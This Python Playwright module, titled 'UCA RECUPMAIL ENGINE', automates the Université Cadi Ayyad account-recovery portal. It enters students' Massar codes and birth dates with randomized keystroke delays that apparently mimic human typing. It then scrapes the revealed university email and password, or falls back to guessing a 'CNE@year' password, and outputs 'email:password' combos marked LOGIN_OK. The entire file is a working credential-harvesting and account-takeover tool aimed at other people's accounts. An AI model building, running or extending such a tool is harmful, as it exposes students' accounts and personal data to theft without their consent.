"""
UCA RECUPMAIL ENGINE — Core verification module for UCA portal
Clean manual slow typing with accurate parsing and extraction for LOGIN_OK (Email:Password).
"""

import re
import time
import random

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"

class UCAEngine:
    def __init__(self):
        pass

    def run_workflow(self, page, cne, dob):
        result_data = {
            "cne": cne,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            # Page stable
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1200, 2000))

            inputs = page.locator('input')
            if inputs.count() < 2:
                result_data["status"] = LoginState.SITE_ERROR
                result_data["detail"] = "Site Error: Required input fields not found"
                return result_data

            # 1. Fill Code Massar (Slow manual typing)
            massar_input = inputs.nth(0)
            massar_input.click()
            page.wait_for_timeout(200)
            massar_input.fill("")
            for char in str(cne):
                massar_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(random.randint(600, 900))

            # 2. Format and Fill Date de naissance (MonthDayYear sequential format e.g. 01182005)
            clean_dob = re.sub(r'[^0-9]', '', str(dob))
            if len(clean_dob) == 8:
                day = clean_dob[:2].zfill(2)
                month = clean_dob[2:4].zfill(2)
                year = clean_dob[4:]
                formatted_dob = f"{month}{day}{year}"
            else:
                formatted_dob = str(dob)

            dob_input = inputs.nth(1)
            dob_input.click()
            page.wait_for_timeout(200)
            dob_input.fill("")
            for char in str(formatted_dob):
                dob_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(900)

            # Click submit button
            submit_clicked = False
            for btn_sel in ['button:has-text("Récupérer")', 'button:has-text("recover")', 'button[type="submit"]', 'input[type="submit"]', '.btn']:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0:
                        btn.click()
                        submit_clicked = True
                        break
                except Exception:
                    continue
            if not submit_clicked:
                page.locator('button').first.click()

            # الانتظار حتى تظهر النتيجة في الصفحة
            page.wait_for_timeout(4000)
            body_text = page.locator("body").inner_text()
            low_text = body_text.lower()

            # 3. التحقق من النجاح واستخراج الإيميل والباسورد بدقة تامة
            if "félicitations" in low_text or "@uca.ac.ma" in low_text:
                email_match = re.search(r'([\w\.-]+@uca\.ac\.ma)', body_text, re.IGNORECASE)
                extracted_email = email_match.group(1) if email_match else f"{cne}@uca.ac.ma"

                # استخراج الباسورد بدقة (مثلاً CNE@Year أو الباسورد المعروض في الصفحة)
                extracted_pwd = None
                pwd_pat = re.search(r'([A-Za-z0-9]+@[0-9]{4})', body_text)
                if pwd_pat:
                    extracted_pwd = pwd_pat.group(1)
                else:
                    lines = body_text.splitlines()
                    for i, line in enumerate(lines):
                        if "mot de passe" in line.lower() and i + 1 < len(lines):
                            extracted_pwd = lines[i+1].strip()
                            break

                if not extracted_pwd:
                    extracted_pwd = f"{cne}@{year if 'year' in locals() else '2005'}"

                final_combo = f"{extracted_email}:{extracted_pwd}"
                result_data["status"] = LoginState.LOGIN_OK
                result_data["extracted_email"] = final_combo
                result_data["detail"] = f"Success | {final_combo}"
                return result_data

            # 4. فحص الأخطاء في حالة الفشل
            error_keywords = ["échouée", "incorrectes", "invalide", "الرقم", "غير صحيح", "introuvable"]
            if any(kw in low_text for kw in error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect Code CNE or DOB (Login Error)"
                return result_data

            result_data["status"] = LoginState.LOGIN_ERROR
            result_data["detail"] = "Failed: Unknown response state"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data